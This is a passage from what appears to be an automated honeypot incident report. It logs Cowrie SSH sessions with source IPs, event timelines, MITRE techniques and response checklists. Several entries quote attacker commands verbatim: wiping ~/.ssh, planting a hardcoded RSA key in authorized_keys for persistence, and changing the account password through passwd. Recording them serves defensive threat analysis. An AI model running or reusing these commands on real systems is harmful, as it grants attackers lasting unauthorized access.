| `2026-07-19 17:44:11` | `cowrie.login.success` |
| `2026-07-19 17:44:12` | `cowrie.session.params` |
| `2026-07-19 17:44:12` | `cowrie.command.input` |
| `2026-07-19 17:44:12` | `cowrie.command.failed` |
| `2026-07-19 17:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.137[.]24` to AbuseIPDB if not already reported
- [ ] Block `180.76.137[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a861dd1d94b6

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-07-19 17:49 |
| **Last Seen** | 2026-07-19 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:49:04` | `cowrie.session.connect` |
| `2026-07-19 17:49:04` | `cowrie.client.version` |
| `2026-07-19 17:49:04` | `cowrie.client.kex` |
| `2026-07-19 17:49:06` | `cowrie.login.success` |
| `2026-07-19 17:49:07` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5d8e03141e3

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-07-19 17:51 |
| **Last Seen** | 2026-07-19 17:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:51:01` | `cowrie.session.connect` |
| `2026-07-19 17:51:01` | `cowrie.client.version` |
| `2026-07-19 17:51:01` | `cowrie.client.kex` |
| `2026-07-19 17:51:02` | `cowrie.login.success` |
| `2026-07-19 17:51:03` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06122334823a

| Field | Detail |
|---|---|
| **Source IP** | `180.76.137[.]24` |
| **First Seen** | 2026-07-19 17:52 |
| **Last Seen** | 2026-07-19 17:52 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "alicia\nPTaY3Ll76eII\nPTaY3Ll76eII"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:52:09` | `cowrie.session.connect` |
| `2026-07-19 17:52:10` | `cowrie.client.version` |
| `2026-07-19 17:52:10` | `cowrie.client.kex` |
| `2026-07-19 17:52:11` | `cowrie.login.success` |
| `2026-07-19 17:52:12` | `cowrie.session.params` |
| `2026-07-19 17:52:12` | `cowrie.command.input` |
| `2026-07-19 17:52:12` | `cowrie.command.failed` |
| `2026-07-19 17:52:13` | `cowrie.log.closed` |
| `2026-07-19 17:52:14` | `cowrie.session.params` |
| `2026-07-19 17:52:14` | `cowrie.command.input` |
| `2026-07-19 17:52:14` | `cowrie.session.file_download` |
| `2026-07-19 17:52:14` | `cowrie.log.closed` |
| `2026-07-19 17:52:27` | `cowrie.session.params` |
| `2026-07-19 17:52:27` | `cowrie.command.input` |
| `2026-07-19 17:52:27` | `cowrie.log.closed` |
| `2026-07-19 17:52:28` | `cowrie.session.params` |
| `2026-07-19 17:52:28` | `cowrie.command.input` |
| `2026-07-19 17:52:28` | `cowrie.command.input` |
| `2026-07-19 17:52:29` | `cowrie.command.failed` |
| `2026-07-19 17:52:29` | `cowrie.log.closed` |
| `2026-07-19 17:52:30` | `cowrie.session.params` |
| `2026-07-19 17:52:30` | `cowrie.command.input` |
| `2026-07-19 17:52:31` | `cowrie.log.closed` |
| `2026-07-19 17:52:32` | `cowrie.session.params` |
| `2026-07-19 17:52:32` | `cowrie.command.input` |
| `2026-07-19 17:52:32` | `cowrie.log.closed` |
| `2026-07-19 17:52:33` | `cowrie.session.params` |
| `2026-07-19 17:52:33` | `cowrie.command.input` |
| `2026-07-19 17:52:33` | `cowrie.log.closed` |
| `2026-07-19 17:52:34` | `cowrie.session.params` |
| `2026-07-19 17:52:34` | `cowrie.command.input` |
| `2026-07-19 17:52:34` | `cowrie.command.input` |
| `2026-07-19 17:52:35` | `cowrie.log.closed` |
| `2026-07-19 17:52:36` | `cowrie.session.params` |
| `2026-07-19 17:52:36` | `cowrie.command.input` |
| `2026-07-19 17:52:36` | `cowrie.log.closed` |
| `2026-07-19 17:52:37` | `cowrie.session.params` |
| `2026-07-19 17:52:37` | `cowrie.command.input` |
| `2026-07-19 17:52:37` | `cowrie.log.closed` |
| `2026-07-19 17:52:38` | `cowrie.session.params` |
| `2026-07-19 17:52:38` | `cowrie.command.input` |
| `2026-07-19 17:52:39` | `cowrie.log.closed` |
| `2026-07-19 17:52:40` | `cowrie.session.params` |
| `2026-07-19 17:52:40` | `cowrie.command.input` |
| `2026-07-19 17:52:40` | `cowrie.log.closed` |
| `2026-07-19 17:52:41` | `cowrie.session.params` |
| `2026-07-19 17:52:41` | `cowrie.command.input` |
| `2026-07-19 17:52:41` | `cowrie.log.closed` |
| `2026-07-19 17:52:42` | `cowrie.session.params` |
| `2026-07-19 17:52:42` | `cowrie.command.input` |
| `2026-07-19 17:52:43` | `cowrie.log.closed` |
| `2026-07-19 17:52:44` | `cowrie.session.params` |
| `2026-07-19 17:52:44` | `cowrie.command.input` |
| `2026-07-19 17:52:44` | `cowrie.log.closed` |
| `2026-07-19 17:52:45` | `cowrie.session.params` |
| `2026-07-19 17:52:45` | `cowrie.command.input` |
| `2026-07-19 17:52:45` | `cowrie.log.closed` |
| `2026-07-19 17:52:46` | `cowrie.session.params` |
| `2026-07-19 17:52:46` | `cowrie.command.input` |
| `2026-07-19 17:52:47` | `cowrie.log.closed` |
| `2026-07-19 17:52:48` | `cowrie.session.params` |
| `2026-07-19 17:52:48` | `cowrie.command.input` |
| `2026-07-19 17:52:48` | `cowrie.log.closed` |
| `2026-07-19 17:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.137[.]24` to AbuseIPDB if not already reported
- [ ] Block `180.76.137[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b029612dcfeb

| Field | Detail |
|---|---|
| **Source IP** | `112.53.235[.]78` |
| **First Seen** | 2026-07-19 17:55 |
| **Last Seen** | 2026-07-19 17:58 |
| **Session Duration** | 171s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/busybox kYmyy1ND ` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:55:44` | `cowrie.session.connect` |
| `2026-07-19 17:55:44` | `cowrie.client.version` |
| `2026-07-19 17:55:45` | `cowrie.client.kex` |
| `2026-07-19 17:55:56` | `cowrie.login.success` |
| `2026-07-19 17:56:00` | `cowrie.client.size` |
| `2026-07-19 17:56:00` | `cowrie.session.params` |
| `2026-07-19 17:56:00` | `cowrie.command.input` |
| `2026-07-19 17:56:00` | `cowrie.command.input` |
| `2026-07-19 17:58:35` | `cowrie.log.closed` |
| `2026-07-19 17:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.235[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.53.235[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892d0b6e99ed

| Field | Detail |
|---|---|
| **Source IP** | `112.53.235[.]78` |
| **First Seen** | 2026-07-19 17:58 |
| **Last Seen** | 2026-07-19 18:01 |
| **Session Duration** | 160s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/busybox kYmyy1ND ` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:58:36` | `cowrie.session.connect` |
| `2026-07-19 17:58:36` | `cowrie.client.version` |
| `2026-07-19 17:58:36` | `cowrie.client.kex` |
| `2026-07-19 17:58:43` | `cowrie.login.success` |
| `2026-07-19 17:58:45` | `cowrie.client.size` |
| `2026-07-19 17:58:45` | `cowrie.session.params` |
| `2026-07-19 17:58:46` | `cowrie.command.input` |
| `2026-07-19 17:58:46` | `cowrie.command.input` |
| `2026-07-19 18:01:16` | `cowrie.log.closed` |
| `2026-07-19 18:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.235[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.53.235[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c08d75f663a

| Field | Detail |
|---|---|
| **Source IP** | `112.53.235[.]78` |
| **First Seen** | 2026-07-19 18:01 |
| **Last Seen** | 2026-07-19 18:04 |
| **Session Duration** | 167s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/busybox kYmyy1ND ` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:01:16` | `cowrie.session.connect` |
| `2026-07-19 18:01:16` | `cowrie.client.version` |
| `2026-07-19 18:01:17` | `cowrie.client.kex` |
| `2026-07-19 18:01:22` | `cowrie.login.success` |
| `2026-07-19 18:01:23` | `cowrie.client.size` |
| `2026-07-19 18:01:24` | `cowrie.session.params` |
| `2026-07-19 18:01:24` | `cowrie.command.input` |
| `2026-07-19 18:01:24` | `cowrie.command.input` |
| `2026-07-19 18:04:04` | `cowrie.log.closed` |
| `2026-07-19 18:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.235[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.53.235[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b103085cdeb

| Field | Detail |
|---|---|
| **Source IP** | `165.154.193[.]52` |
| **First Seen** | 2026-07-19 18:04 |
| **Last Seen** | 2026-07-19 18:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:04:01` | `cowrie.session.connect` |
| `2026-07-19 18:04:01` | `cowrie.client.version` |
| `2026-07-19 18:04:06` | `cowrie.client.kex` |
| `2026-07-19 18:04:07` | `cowrie.login.success` |
| `2026-07-19 18:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.193[.]52` to AbuseIPDB if not already reported
- [ ] Block `165.154.193[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe172a76210

| Field | Detail |
|---|---|
| **Source IP** | `111.230.201[.]117` |
| **First Seen** | 2026-07-19 18:04 |
| **Last Seen** | 2026-07-19 18:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:04:43` | `cowrie.session.connect` |
| `2026-07-19 18:04:43` | `cowrie.client.version` |
| `2026-07-19 18:04:44` | `cowrie.client.kex` |
| `2026-07-19 18:04:45` | `cowrie.login.success` |
| `2026-07-19 18:04:47` | `cowrie.session.params` |
| `2026-07-19 18:04:47` | `cowrie.command.input` |
| `2026-07-19 18:04:47` | `cowrie.command.failed` |
| `2026-07-19 18:04:47` | `cowrie.log.closed` |
| `2026-07-19 18:04:48` | `cowrie.session.params` |
| `2026-07-19 18:04:48` | `cowrie.command.input` |
| `2026-07-19 18:04:49` | `cowrie.session.file_download` |
| `2026-07-19 18:04:49` | `cowrie.log.closed` |
| `2026-07-19 18:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.230.201[.]117` to AbuseIPDB if not already reported
- [ ] Block `111.230.201[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4287c0c918ed

| Field | Detail |
|---|---|
| **Source IP** | `111.230.201[.]117` |
| **First Seen** | 2026-07-19 18:04 |
| **Last Seen** | 2026-07-19 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:04:49` | `cowrie.session.connect` |
| `2026-07-19 18:04:49` | `cowrie.client.version` |
| `2026-07-19 18:04:49` | `cowrie.client.kex` |
| `2026-07-19 18:04:50` | `cowrie.login.success` |
| `2026-07-19 18:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.230.201[.]117` to AbuseIPDB if not already reported
- [ ] Block `111.230.201[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f96363e7fa

| Field | Detail |
|---|---|
| **Source IP** | `111.230.201[.]117` |
| **First Seen** | 2026-07-19 18:04 |
| **Last Seen** | 2026-07-19 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:04:50` | `cowrie.session.connect` |
| `2026-07-19 18:04:50` | `cowrie.client.version` |
| `2026-07-19 18:04:51` | `cowrie.client.kex` |
| `2026-07-19 18:04:52` | `cowrie.login.success` |
| `2026-07-19 18:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.230.201[.]117` to AbuseIPDB if not already reported
- [ ] Block `111.230.201[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dde4b82cc26

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 18:07 |
| **Last Seen** | 2026-07-19 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:07:12` | `cowrie.session.connect` |
| `2026-07-19 18:07:12` | `cowrie.client.version` |
| `2026-07-19 18:07:12` | `cowrie.client.kex` |
| `2026-07-19 18:07:12` | `cowrie.login.success` |
| `2026-07-19 18:07:13` | `cowrie.session.params` |
| `2026-07-19 18:07:13` | `cowrie.command.input` |
| `2026-07-19 18:07:13` | `cowrie.log.closed` |
| `2026-07-19 18:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3e33507712

| Field | Detail |
|---|---|
| **Source IP** | `180.76.137[.]24` |
| **First Seen** | 2026-07-19 18:11 |
| **Last Seen** | 2026-07-19 18:16 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:11:07` | `cowrie.session.connect` |
| `2026-07-19 18:11:07` | `cowrie.client.version` |
| `2026-07-19 18:11:07` | `cowrie.client.kex` |
| `2026-07-19 18:11:08` | `cowrie.login.success` |
| `2026-07-19 18:11:09` | `cowrie.session.params` |
| `2026-07-19 18:11:09` | `cowrie.command.input` |
| `2026-07-19 18:11:09` | `cowrie.command.failed` |
| `2026-07-19 18:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.137[.]24` to AbuseIPDB if not already reported
- [ ] Block `180.76.137[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f0f8fc4680

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-07-19 18:14 |
| **Last Seen** | 2026-07-19 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:14:04` | `cowrie.session.connect` |
| `2026-07-19 18:14:04` | `cowrie.client.version` |
| `2026-07-19 18:14:04` | `cowrie.client.kex` |
| `2026-07-19 18:14:05` | `cowrie.login.success` |
| `2026-07-19 18:14:06` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e562391c0f6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 18:14 |
| **Last Seen** | 2026-07-19 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:14:41` | `cowrie.session.connect` |
| `2026-07-19 18:14:41` | `cowrie.client.version` |
| `2026-07-19 18:14:41` | `cowrie.client.kex` |
| `2026-07-19 18:14:41` | `cowrie.login.success` |
| `2026-07-19 18:14:42` | `cowrie.session.params` |
| `2026-07-19 18:14:42` | `cowrie.command.input` |
| `2026-07-19 18:14:42` | `cowrie.log.closed` |
| `2026-07-19 18:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ed54320f07

| Field | Detail |
|---|---|
| **Source IP** | `186.23.209[.]47` |
| **First Seen** | 2026-07-19 18:15 |
| **Last Seen** | 2026-07-19 18:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:15:38` | `cowrie.session.connect` |
| `2026-07-19 18:15:38` | `cowrie.client.version` |
| `2026-07-19 18:15:38` | `cowrie.client.kex` |
| `2026-07-19 18:15:40` | `cowrie.login.success` |
| `2026-07-19 18:15:41` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.23.209[.]47` to AbuseIPDB if not already reported
- [ ] Block `186.23.209[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ccdeae5796

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-19 18:15 |
| **Last Seen** | 2026-07-19 18:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:15:46` | `cowrie.session.connect` |
| `2026-07-19 18:15:47` | `cowrie.client.version` |
| `2026-07-19 18:15:47` | `cowrie.client.kex` |
| `2026-07-19 18:15:49` | `cowrie.login.success` |
| `2026-07-19 18:15:50` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba080140a32

| Field | Detail |
|---|---|
| **Source IP** | `202.111.183[.]30` |
| **First Seen** | 2026-07-19 18:19 |
| **Last Seen** | 2026-07-19 18:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:19:06` | `cowrie.session.connect` |
| `2026-07-19 18:19:07` | `cowrie.client.version` |
| `2026-07-19 18:19:07` | `cowrie.client.kex` |
| `2026-07-19 18:19:10` | `cowrie.login.success` |
| `2026-07-19 18:19:11` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.111.183[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.111.183[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c735729b7d3

| Field | Detail |
|---|---|
| **Source IP** | `67.85.146[.]216` |
| **First Seen** | 2026-07-19 18:19 |
| **Last Seen** | 2026-07-19 18:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:19:21` | `cowrie.session.connect` |
| `2026-07-19 18:19:21` | `cowrie.client.version` |
| `2026-07-19 18:19:21` | `cowrie.client.kex` |
| `2026-07-19 18:19:22` | `cowrie.login.success` |
| `2026-07-19 18:19:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.85.146[.]216` to AbuseIPDB if not already reported
- [ ] Block `67.85.146[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3d64a09a89

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-19 18:25 |
| **Last Seen** | 2026-07-19 18:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:25:36` | `cowrie.session.connect` |
| `2026-07-19 18:25:37` | `cowrie.client.version` |
| `2026-07-19 18:25:37` | `cowrie.client.kex` |
| `2026-07-19 18:25:40` | `cowrie.login.success` |
| `2026-07-19 18:25:41` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf827e24fed5

| Field | Detail |
|---|---|
| **Source IP** | `84.5.129[.]68` |
| **First Seen** | 2026-07-19 18:25 |
| **Last Seen** | 2026-07-19 18:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:25:46` | `cowrie.session.connect` |
| `2026-07-19 18:25:46` | `cowrie.client.version` |
| `2026-07-19 18:25:46` | `cowrie.client.kex` |
| `2026-07-19 18:25:47` | `cowrie.login.success` |
| `2026-07-19 18:25:47` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.5.129[.]68` to AbuseIPDB if not already reported
- [ ] Block `84.5.129[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1410cac38f78

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]46` |
| **First Seen** | 2026-07-19 18:28 |
| **Last Seen** | 2026-07-19 18:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
